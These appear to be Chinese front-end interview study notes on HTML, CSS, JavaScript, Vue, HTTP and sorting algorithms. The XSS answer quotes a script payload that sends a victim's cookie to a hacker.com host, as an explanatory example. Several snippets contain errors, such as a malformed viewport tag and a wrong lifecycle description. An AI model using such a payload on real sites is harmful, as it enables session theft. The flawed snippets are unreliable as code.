HTML

如何理解前端语义化？（*）

- 不仅要使机器（有助于SEO）易于理解，也要使人易于理解 
- 尽可能少的使用无语义的标签div和span 
- 多使用 强调（strong ），段落（p），标题用（h1），页眉（header），页脚（footer），导航链接 （nav），边栏（aside）

META viewport的作用？

<meta name="viewport" content="width=devidce-width",user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimun-scale=1.0">

控制移动端页面的显示

CANVAS

show项目

正则表达式

在移动端的响应式方面需要做什么？



CSS

盒模型

content-box : width == 内容区宽度

border-box : width == 内容区宽度 + padding宽度 + border宽度

- 如何设置两种模型：

box-sizing: content-box 是W3C盒子模型    

box-sizing: border-box 是IE盒子模型 

box-sizing的默认属性是content-box

如何居中？

水平居中

1. 子元素margin:0 auto,子元素要有宽度
2. 父元素text-align:center,子元素inline-block
3. 父元素position:relative,子元素position:absolute;left:50%;transform:translateX(-50%)
4. 父元素display:flex;justify-content:center;(需要子元素有宽度)
5. 父元素display:tablecell;text-align:center

垂直居中

1. display:inline-block;vertical-align:middle
2. 父元素position:relative,子元素position:absolute;top:50%;transform:translateY(-50%)
3. line-height:200px
4. 父元素display:tablecell;vertical-align:center
5. 父元素display:flex;align-items:center(需要子元素有宽度)

左侧固定右侧自适应

1.     left{widthL100px
       	float:left}
       right{overflow:hidden}
2.     left{
           width:100xp;
           float:left
       }
       right{margin-left:100px}
3.     left{float:left}
       right{width:100%}
4.     left{position:absolute;left:0;width:100%}
       right{position:absolute;left:100px;width:100%}
5.     parent{display:flex}
       right{flex:1}

两边固定中间自适应的三列布局

元素左float:left;width:200px;或使用绝对定位

元素右float:right;width:100px;或使用绝对定位

元素中margin:0 120px 0 220px

选择器优先级如何确定

1、选择器越具体，优先级越高

2、同样优先级，写在后面的覆盖前面的

3、！important > id > class >tag >通配符

BFC块级格式化上下文是什么

特性

BFC元素里面的元素不会在布局上影响外侧的元素

作用

1. 同一个 BFC 下外边距会发生折叠
2. BFC 可以包含浮动的元素(清除浮动)
3. BFC 可以阻止元素被浮动元素覆盖

- overflow：父标签hidden 清除浮动
- overflow：hidden 取消父子margin合并（子设置margin，父也会有margin）

如何触发BFC

- float的值不为none        
- overflow的值不为visible        
- display的值为inline-block、table-cell、table-caption        
- position的值为absolute或fixed。 

有哪些清除浮动的技术，都适用哪些情况？

1、浮动带来的副作用：

1）块状元素，会钻进浮动元素的下面，被浮动元素所覆盖

  

2）行内元素，例如文字， 则会环绕在浮动元素的周围，为浮动元素留出空间

 

3）浮动元素的父元素坍缩

 

2、清除浮动：

 

1）在浮动的盒子之下再放一个标签，在这个标签中使用clear:both，来清除浮动对页面的影响.

2）触发浮动元素父元素的BFC，使到该父元素可以包含浮动元素。

JS

JS的数据类型

string number boolean undefined null object symbol

object包括了数组、函数

NaN是num

声明前置

变量提升/函数提升？

- 使用var关键字声明或初始化的变量，会将声明语句“提升”到当前作用域的顶部。 但是，只有声明才会触发提升，赋值语句（如果有的话）将保持原样。
- 用 var 声明得到提升，用 let/const 声明不会提升。
- 函数声明会使函数体提升，但函数表达式在使用前必须赋值，函数表达式定义的函数则只能在声明之后调用。

function functionName(){ //函数声明 } var a = function(arg0,arg1){ //函数表达式 };

数组的增删改查

增

- push() 添加至数组末尾，并返回修改后数组的长度 
- unshift()  逐个添加至数组前端，同样返回新数组长度 

删

- pop()从数组末尾删除最后一项并返回该项 
- shift() 删除数组第一项并返回该项 

改

- splice()   arr.splice(2,1,0.5,1,1.5);  第1个参数用于指定要删除的第一项的位置，第2个参数用于指定要删除元素的个数 ，后续向指定位置插入任意数量的元素 

查

- indexOf()从数组的开头（位置0）开始向后查找  ，当找不到该元素时，返回 -1 

基本类型和引用类型修改值后的情况

引用类型是引用地址，赋值后修改值会使所有新赋值的值也修改。

Promise如何使用(*)

- .then的用法  $.ajax().then(成功函数、失败函数)
- .then的链式调用
- 如何自己生成Promise对象
        function xxx(){
      	return new Promise(function(resolve,reject){
             if(){
                 resolve(data)
             }else{
                 reject(data)
             }
      	})
        }

  xxx().then()

    ### 手写AJAX
    

let xhr = new XMLHttpRequest()

xhr.open('GET','/xxxx')

xhr.onreadystatechange = function(){

    if(xhr.readyState === 4 && xhr.status === 200){

        console.log(xhr.responseText)

    }

}

xhr.send('a=1&b=2')

    

POST：

//创建异步对象  

var xhr = new XMLHttpRequest();

//设置请求的类型及url

//post请求一定要添加请求头才行不然会报错

xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");

 xhr.open('post', '02.post.php' );

//发送请求

xhr.send('name=fox&age=18');

xhr.onreadystatechange = function () {

    // 这步为判断服务器是否正确响应

  if (xhr.readyState == 4 && xhr.status == 200) {

    console.log(xhr.responseText);

  } 

};

    
    
    ### 闭包是什么
    

function createAdder(){

    var n=0

    return function(){

        n += 1

        console.log(n)

    }

}

let adder = createAdder()

adder() //1

adder() //2

console.log(n) //n is not undefined

    - 每次定义一个函数，都会产生一个作用域链（scope chain）。当JavaScript寻找变量varible时（这个过程称为变量解析），总会优先在当前作用域链的第一个对象中查找属性varible ，如果找到，则直接使用这个属性；否则，继续查找下一个对象的是否存在这个属性。
    - 而js中函数是可以作为普通对象到处传递的，于是便会有一个function内部定义的函数放到其他任何地方使用的情况。而所谓的闭包就是当函数在其他地方使用的时候能保存下函数所需要的运行环境，也即是函数能保存下函数诞生时的环境。
    - JavaScript中的函数运行在它们被定义的作用域里，而不是它们被执行的作用域里。
    
    **整理：**
    
    1.什么是闭包?
    
    简单来说，闭包是指可以访问另一个函数作用域变量的函数，一般是定义在外层函数中的内层函数。
    
    2.为什么需要闭包？
    
    局部变量无法共享和长久的保存，而全局变量可能造成变量污染，所以我们希望有一种机制既可以长久的保存变量又不会造成全局污染。
    
    3.特点
    
    占用更多内存
    
    不容易被释放
    
    4.何时使用？
    
    变量既想反复使用，又想避免全局污染
    
    5.如何使用？
    
    1)定义外层函数，封装被保护的局部变量。 
    
    2)定义内层函数，执行对外部函数变量的操作。 
    
    3)外层函数返回内层函数的对象，并且外层函数被调用，结果保存在一个全局的变量中。
    
    ### 请描述事件冒泡，怎么取消事件冒泡？
    
    当子元素事件触发，事件会沿着包含关系向上传递
    
    取消冒泡：event.stopPropagation();
    
    ### ES5怎么实现使一个属性不被改变？
    
    ### 使用new操作符调用函数创建实例的执行步骤？
    
    1. 创建一个新对象；
    2. 将函数的作用域赋给新对象（this指向新对象）；
    3. 执行函数中的代码；
    4. 返回新对象 
    
    ### this
    
    * 没有对象只有方法则指向全局对象
    
      fn()的this是window
    
    * 有对象调用方法就指向调用对象
    
      a.fn()的this是a
    
    * new F()的this是新实例
    
    * 箭头函数里的this是外部作用域的this
    
    * 
    
    ### 立即执行函数
    

(function(){});

(function(){})()

    立即执行函数是为了生成一个函数作用域，防止污染全局变量
    
    ### 如何实现深拷贝
    
    * 用JSON深拷贝
    
      ```js
      var a = {...}
      var b = JSON.parse(JSON.stringify(a))

- 递归拷贝
      function clone(object){
          var object2
          if(object instanceof Array){
              object2 = []
          }else if(object instanceof Function){
              object2 = eval(object.toString())
          }else if(object instanceof Object){
              object2 = {}
          }
          for(let key in object){
              object2[key] = clone(object[key])
          }
          return object2
      }

如何实现数组去重

- 计数排序的逻辑(只能正整数)

    var a = [正整数....]
    var hashTab = {}
    for(let i=0;i<a.length;i++){
        if(a[i] in hashTab){
            
        }else{
            hashTab[a[i]] = true
        }
    }
    console.log(Object.keys(hashTab))

- Set去重

    let array = [1, 1, 1, 1, 2, 3, 4, 4, 5, 3];
    let set = new Set(array);
    console.log(set);
     // => Set {1, 2, 3, 4, 5}

原型

array.push(num)中push是沿着array.__proto__找到的，也就是Array.prototype.push

原型图





如何判断一个变量是Array类型？如何判断一个变量是Number类型？

- 数组：

1. arr instanceof Array); // true  instanceof 运算符用来测试一个对象是否是后者的实例。
2. arr.constructor === Array ; // true
3. Array.isArray([1, 2, 3]); // true 
4. Object.prototype.toString.call(arr);   //'[object Array]' 此种方法最准确

- Number：
  isNaN 如果为true则不是Number类型

请解释function foo() {}和var foo = function() {}之间foo的用法上的区别。

1. var foo = function() {}
   编译后变量声明foo会“被提前”了，但是他的赋值（也就是FUNCTION_BODY）并不会被提前。
   也就是，匿名函数只有在被调用时才被初始化。
2. function foo() {}
   编译后函数声明和他的赋值都会被提前。
   也就是说函数声明过程在整个程序执行之前的预处理就完成了，所以只要处于同一个作用域，就可以访问到，即使在定义之前调用它也可以。

匿名函数？

1、匿名函数的事件不能解绑

2、匿名函数和普通函数最大的区别是在于，匿名函数可以作为一个具体的“值”赋予给变量或者对象属性，其次，由于匿名函数可以被定义在不同地方，使得他可以有效利用他所在的局域内的变量（或者说上下文中的变量）。

请说明.forEach循环和.map()循环的主要区别，它们分别在什么情况下使用？

- 相同点：

1）都是循环遍历数组中的每一项

2）forEach和map方法里每次执行匿名函数都支持3个参数，参数分别是item（当前每一项）、index（索引值）、arr（原数组）

3）匿名函数中的this都是指向window

4）只能遍历数组

- 区别：

区别在于map有返回值，而forEach没有返回值。

map方法返回一个新的数组

forEach()方法用于调用数组的每个元素，将元素传给回调函数。

性能上map稍落后于forEach

ES6的class

生成实例对象的传统方法是通过构造函数 ,

    function Point(x, y) {
      this.x = x;
      this.y = y;
    }
    
    Point.prototype.toString = function () {
      return '(' + this.x + ', ' + this.y + ')';
    };
    
    var p = new Point(1, 2);

上面的代码用 ES6 的class改写 

    //定义类
    class Point {
      constructor(x, y) {
        this.x = x;
        this.y = y;
      }
    
      toString() {
        return '(' + this.x + ', ' + this.y + ')';
      }
    }

JS如何实现继承

- 通过原型链实现继承
      function Dialog(target) {
          this.target = target
      }
      Dialog.prototype.show = function() {
          console.log(this.target + ' show')
      }
      Dialog.prototype.hide = function() {
          console.log(this.target + ' hide')
      }
      var dialog = new Dialog('body')
      dialog.show()
      
      function Message(target, name) {
          Dialog.call(this, target)     //这句很重要
          this.name = name
      }
      Message.prototype = Object.create(Dialog.prototype)   //这句更重要
      Message.prototype.success = function() {
          console.log(this.name + ' success' )
      }
      
      var msgBox = new Message('main', 'msg')
      msgBox.show()
      msgBox.success()
- 通过extends关键字
      class Point {
      }
      class ColorPoint extends Point {
      }//上面代码定义了一个ColorPoint类，该类通过extends关键字，继承了Point类的所有属性和方法。但是由于没有部署任何代码，所以这两个类完全一样，等于复制了一个Point类

DOM

DOM时间模型

- 捕获
- 冒泡

document 中的load事件和DOMContentLoaded事件之间的区别是什么？

  1)document.ready监控dom是否加载完毕,dom加载完毕时及资源加载之前触发 

  2)window.onload当页面全部加载完成（包括所有资源）

  3)DOMContentLoaded: 在形成完整的DOM树之后就会触发，而不理会图像、javascript文件、CSS文件或其他资源是否下载完毕

移动端的触摸事件

- touchstart touchmove touchend touchcancel
- 模拟swipe事件：记录两次touchmove的位置差

事件委托

监听父元素，看事件触发是哪个子元素

    <ul id="ul1">
        <li>111</li>
        <li>222</li>
        <li>333</li>
        <li>444</li>
    </ul>
    
    window.onload = function(){
        var oUl = document.getElementById("ul1");
       oUl.onclick = function(){
            alert(123);
        }
    }

DOM操作——怎样添加、移除、移动、复制、创建和查找节点?

（1）创建新节点

      createDocumentFragment()   //创建一个DOM片段

      createElement_x_x()   //创建一个具体的元素

      createTextNode()   //创建一个文本节点

（2）添加、移除、替换、插入

      appendChild()

      removeChild()

      replaceChild()

      insertBefore()

（3）查找

      getElementsByTagName() 

      getElementsByName() 

      getElementById() 

      getElementByClassName() 

HTTP

HTTP报文

三个部分组成

1. 对报文描述的起始行 - startline 
2. 包含属性的首部块 - header
3. 可选的包含数据的主题部分 - body 

    HTTP/1.0 200 OK
    content-type：text/plain
    content-length:19
    
    Hi,I'm a message



状态码

1XX信息性状态码(Informational)服务器正在处理请求

2XX成功状态码(Success)请求已正常处理完毕

	200 OK  表示请求被服务器正常处理

	204 No Content    表示请求已成功处理，但是没有内容返回(就应该没有内容返回的状况)

	206 Partial Content    表示服务器已经完成了部分GET请求

3XX重定向状态码(Redirection)需要进行额外操作以完成请求

	301 Moved Permanently    永久重定向，表示请求的资源已经永久的搬到了其他位置

	302 Found  临时重定向，表示请求的资源临时搬到了其他位置

	303 See Other  表示请求资源存在另一个URI，应使用GET定向获取请求资源

	304 Not Modified  表示客户端发送附带条件的请求(GET方法请求报文中的IF…)时，条件不满足

4XX客户端错误状态码(Client Error)客户端原因导致服务器无法处理请求

	400 Bad Request  表示请求报文存在语法错误或参数错误，服务器不理解

	401 Unauthorized  表示发送的请求需要有HTTP认证信息或者是认证失败了

	403 Forbidden    表示对请求资源的访问被服务器拒绝了

	404 Not Found  表示服务器找不到你请求的资源

5XX服务器错误状态码(Server Error)服务器原因导致处理请求出错

	500 Internal Server Error  表示服务器执行请求的时候出错了

	503 Service Unavailable  表示服务器超负载或正停机维护，无法处理请求

301和302的区别

- 301永久重定向：浏览器会缓存
- 302临时重定向：浏览器不缓存

HTTP缓存怎么做

- Cache-Contrl:max-age=300
- http://cdn.com/1.js?v=1避开缓存

Cookie是什么？ Session是什么？

  特性     	                 Cookie                 	Localstorage                      	sessionstorage        
  生命周期   	一般由服务器生成，可设置失效时间。如果在浏览器端生成Cookie，默认是关闭浏览器后失效。	除非被清除，否则永久保存                      	仅在当前会话下有效，关闭页面或浏览器后被清除
  数据大小   	                   4k                   	5MB                               	                      
  与服务器端通信	 每次都会携带在HTTP头中，如果使用cookie保存过多数据会带来性能问题  	仅在客户端(即浏览器)中保存，不参与和服务器的通信         	                      
  用途     	                用于标识用户身份                	用于浏览器端缓存数据                        	                      
  易用性    	    cookie需要自己封装setCookie，getCookie     	可以用源生接口，也可再次封装来对Object和Array有更好的支持	                      

cookie

- HTTP响应通过Set-cookie设置Cookie
- 浏览器访问指定域名时必须带上cookie作为request header
- cookie一般用来记录用户信息

session

- session是服务器端的内存
- session一般通过在cookie里记录sessionID实现
- sessionID一般是随机数

localstorage和cookie区别

- cookie会随请求发送到服务器上，localstorage不会
- cookie一般大小4k，localstorage一般是5M

GET和POST的区别

- GET的参数放在URL的查询参数里，POST的参数放在请求消息体（数据）里
- 安全：GET没有POST安全
- GET的参数有长度限制，一般是1024个字符，POST的参数没有长度限制，一般是4-10Mb
- 包：GET请求只需发一个包，POST请求需要发两个以上包（因为POST有消息体）
- GET用来读数据，POST用来写数据

跨域？JSONP？CORS？

- js里发送ajax请求，如果请求的URL和当前的URL非同于，浏览器拒接提供接受的收据并报错。
- 解决办法：JSONP、CORS
- 同域名，同端口，同协议

JSONP

可以通过提前在页面上声明一个函数，再创建一个script便签，并在src引用地址，同时后端在原始数据上进行函数包裹。

CORS

跨域资源共享，需要服务端配合将返回结果加上响应头：ACCESS-CONtrOL-allow-origin

VUE

vue的生命周期

Vue共有8个生命周期钩子函数，分别为：

- beforeCreate el 和 data 并未初始化均为undefined
- created 完成了 data 数据的初始化，el没有初始化
- beforeMount 完成了el初始化,但data并没有挂载完成
- mounted 完成了挂载
- beforeUpdate 数据更新之前
- updated 数据更新之前
- beforeDestroy 实例销毁之前，在这一步，实例仍然完全可用
- destroyed Vue 实例销毁后，Vue 实例指示的所有东西都会解绑定

如何组件通信

- 父子通信 ：prop、v-on绑定事件
- 爷孙通信：通过两对父子通信
- 兄弟通信：new Vue()作为eventBUS

VUE项目配置文件了解么？

computed实时改变数据的原理

怎么定义vue-router的动态路由？怎么获取传过来的动态参数

答：在router目录下的index.js文件中，对path属性加上/:id。  使用router对象的params.id 

vue-router有哪几种导航钩子？

答：三种，一种是全局导航钩子：router.beforeEach(to,from,next)，作用：跳转前进行判断拦截。第二种：组件内的钩子；第三种：单独路由独享组件 

vuex是什么？怎么使用？哪种功能场景使用它？

答：vue框架中状态管理。在main.js引入store，注入。新建了一个目录store，….. export 。场景有：单页应用中，组件之间的状态。音乐播放、登录状态、加入购物车

请说出vue.cli项目中目录每个文件夹和文件的用法？

Vuex有哪几种属性？

Vue中引入组件的步骤?

1）采用ES6的import ... from ...语法或CommonJS的require()方法引入组件

 2）对组件进行注册,代码如下

    // 注册
    Vue.component('my-component', {
      template: '<div>A custom component!</div>'
    })

3）使用组件<my-component></my-component>

在Vue中使用插件的步骤

- 采用ES6的import ... from ...语法或CommonJSd的require()方法引入插件
- 使用全局方法Vue.use( plugin )使用插件,可以传入一个选项对象Vue.use(MyPlugin, { someOption: true })

请谈谈Vue中的MVVM模式

vue-loader是什么？使用它的用途有哪些？

解析.vue文件的一个加载器。

用途：js可以写es6、style样式可以scss或less、template可以加jade等

VUEX是什么

    <div id="app">
      <p>{{ count }}</p>
      <p>
        <button @click="increment">+</button>
        <button @click="decrement">-</button>
      </p>
    </div>

    const store = new Vuex.Store({
      state: {
        count: 0
      },
      mutations: {
      	increment: state => state.count++,
        decrement: state => state.count--
      }
    })
    
    new Vue({
      el: '#app',
      computed: {
        count () {
    	    return store.state.count
        }
      },
      methods: {
        increment () {
          store.commit('increment')
        },
        decrement () {
        	store.commit('decrement')
        }
      }
    })

双向绑定如何实现的？

vue.js 是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。

具体步骤：

第一步：需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter

这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化

第二步：compile解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图

第三步：Watcher订阅者是Observer和Compile之间通信的桥梁，主要做的事情是:

1、在自身实例化时往属性订阅器(dep)里面添加自己

2、自身必须有一个update()方法

3、待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。

第四步：MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -> 视图更新；视图交互变化(input) -> 数据model变更的双向绑定效果。

如何通过router判断用户权限？

用钩子？

父子组件在调用时的顺序



computed的用法？和method的区别

computed计算的结果如果不发生改变就不会触发result这个函数。

而methods中一般都是定义的需要事件触发的一些函数。每次只要触发事件，就会执行对应的方法。

如果把computed中的方法写到method中会浪费性能。

 computed必须返回一个值页面绑定的才能取得值，而methods中可以只执行逻辑代码，可以有返回值，也可以没有。 

算法

排序算法

冒泡排序

    var examplearr=[8,94,15,88,55,76,21,39];
    function sortarr(arr){
        for(i=0;i<arr.length-1;i++){
            for(j=0;j<arr.length-1-i;j++){
                if(arr[j]>arr[j+1]){
                    var temp=arr[j];
                    arr[j]=arr[j+1];
                    arr[j+1]=temp;
                }
            }
        }
        return arr;
    }
    sortarr(examplearr);

选择排序

    //选择排序
        function arrSort3(arr){
            var len= arr.length,
                minIndex,nu;
            for(var i = 0; i < len-1; i++){
                    minIndex = i;//记录每次循环的第一个数为该次循环的最小值索引
                    for(var j = i+1; j < len; j++){
                        if(arr[j]<arr[minIndex]){
                            minIndex = j;//找到每次循环到的最小值，
                        }
                    }
                    nu = arr[i];
                    arr[i] = arr[minIndex];//将找到的最小值放在每次循环的最开始的地方；
                    arr[minIndex] = nu;
     
                }
            console.log(arr);
        }

计数排序

    function countingSort(arr){
      var len = arr.length,
          Result = [],
          Count = [],
          min = max = arr[0];
      console.time('countingSort waste time:');
      /*查找最大最小值,并将arr数置入Count数组中,统计出现次数*/
      for(var i = 0;i<len;i++){
        Count[arr[i]] = Count[arr[i]] ? Count[arr[i]] + 1 : 1;
        min = min <= arr[i] ? min : arr[i];
        max = max >= arr[i] ? max : arr[i];
      }
      /*从最小值->最大值,将计数逐项相加*/
      for(var j = min;j<max;j++){
        Count[j+1] = (Count[j+1]||0)+(Count[j]||0);
      }
      /*Count中,下标为arr数值,数据为arr数值出现次数;反向填充数据进入Result数据*/
      for(var k = len - 1;k>=0;k--){
        /*Result[位置] = arr数据*/
        Result[Count[arr[k]] - 1] = arr[k];
        /*减少Count数组中保存的计数*/
        Count[arr[k]]--;
        /*显示Result数组每一步详情*/
        console.log(Result);
      }
      console.timeEnd("countingSort waste time:");
      return Result;
    }
    var arr = [3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];
    console.log(countingSort(arr));

快速排序

    　function quickSort(arr){
                //如果数组<=1,则直接返回
                if(arr.length<=1){return arr;}
                var pivotIndex=Math.floor(arr.length/2);
                //找基准，并把基准从原数组删除
                var pivot=arr.splice(pivotIndex,1)[0];
                //定义左右数组
                var left=[];
                var right=[];
    
                //比基准小的放在left，比基准大的放在right
                for(var i=0;i<arr.length;i++){
                    if(arr[i]<=pivot){
                        left.push(arr[i]);
                    }
                    else{
                        right.push(arr[i]);
                    }
                }
                //递归
                return quickSort(left).concat([pivot],quickSort(right));
            }   

插入排序

    function sort(elements){
      //假设第0个元素是一个有序的数列，第1个以后的是无序的序列，
      //所以从第1个元素开始将无序数列的元素插入到有序数列中
      for(var i = 1; i < elements.length; i++){
        //升序
        if(elements[i] < elements[i-1]){
          //取出无序数列中的第i个作为被插入元素
          var guard = elements[i];
          //记住有序数列的最后一个位置，并且将有序数列位置扩大一个
          var j = i - 1;
          elements[i] = elements[j];
          
          //比大小，找到被插入元素所在的位置
          while(j >= 0 && guard < elements[j]){
            elements[j+1] = elements[j];
            j--;
          }
    
          //插入
          elements[j+1] = guard;
        }
      }
    }
    
    var elements = [10, 9, 8, 7, 6, 5];
    console.log('before: ' + elements);
    sort(elements);
    console.log(' after: ' + elements);

二分查找法

安全

什么是XSS攻击，如何预防？

-     div.innerHTML = userComment //userComment内容是<script>$.get('http://hacker.com?cookie')</script>
  偷走用户的cookie
- 预防
  不要使用innerHTML,使用innerText
  如果一定要用innerHTML,字符过滤，把<替换成&lt，>替换成&gt ，&替换成&amp
- 怎么转义？？

什么是CSRF攻击，如何预防

- 过程 

1. 用户在qq.com登录
2. 用户切换到hacker.com（恶意网站）
3. hacker.com发送一个qq.com/friends请求，获取好友信息并盗走

- 用户没有想法这个请求，hacker伪造了用户发请求
- 避免： 检查referer，qq.com可以拒绝非法请求

从输入URL到页面展示过程

1. 检查缓存
2. DNS查询
3. 建立TCP连接，三次握手
4. 发送HTTP请求
5. 后台处理请求
6. 发送HTTP相应
7. 关闭TCP连接，四次挥手
8. 解析HTML
9. 下载CSS、并解析
10. 下载JS、并解析
11. 下载并解析图片
12. 渲染DOM树
13. 渲染样式树
14. 执行JS


